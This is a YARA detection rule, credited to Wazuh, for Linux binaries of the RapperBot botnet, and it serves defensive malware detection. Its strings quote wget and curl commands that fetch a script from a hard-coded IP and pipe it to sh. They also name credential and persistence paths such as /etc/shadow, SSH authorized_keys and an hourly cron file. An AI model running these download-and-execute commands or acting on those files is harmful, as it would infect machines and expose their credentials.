rule RapperBot_Linux {
    meta:
        description = "Detecta variantes do RapperBot"
        author = "Wazuh"
        date = "2024-03-21"
        hash1 = "ff09cf7dfd1dc1466815d4df098065510eec504099ebb02b830309067031fe04"
        hash2 = "88bbb772b8731296822646735aacbfb53014fbb7f90227b44523d7577e0a7ce6"
        
    strings:
        $ssh_key = "AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX"
        
        $cmd1 = "cmd" fullword ascii
        $cmd2 = "sh" fullword ascii
        $cmd3 = "enable" fullword ascii
        $cmd4 = "shell" fullword ascii
        $cmd5 = "debug shell" fullword ascii
        
        $str1 = "SSH-2.0-HELLOWORLD" fullword ascii
        $str2 = "wget http://2.58.149.116/w -O- | sh" ascii
        $str3 = "curl http://2.58.149.116/c -O- | sh" ascii
        
        $file1 = "/etc/passwd" fullword ascii
        $file2 = "/etc/shadow" fullword ascii
        $file3 = "/.ssh/authorized_keys" ascii
        $file4 = "/etc/cron.hourly/0" ascii
        
    condition:
        uint32(0) == 0x464c457f and 
        filesize < 5MB and
        (
            $ssh_key or
            (3 of ($cmd*)) or
            (2 of ($str*)) or
            (2 of ($file*))
        )
} 